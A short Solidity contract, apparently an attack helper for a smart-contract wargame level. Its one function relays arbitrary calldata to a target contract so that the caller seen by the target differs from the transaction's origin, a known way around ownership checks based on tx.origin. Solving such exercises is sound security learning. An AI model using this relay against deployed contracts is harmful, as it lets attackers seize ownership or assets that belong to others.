// SPDX-License-Identifier: UNLICENSED

contract TelephoneProxyHack {
    function doTheMagic(address target, bytes calldata data) public {
        (bool success, ) = target.call(data);
        require(success);
    }
}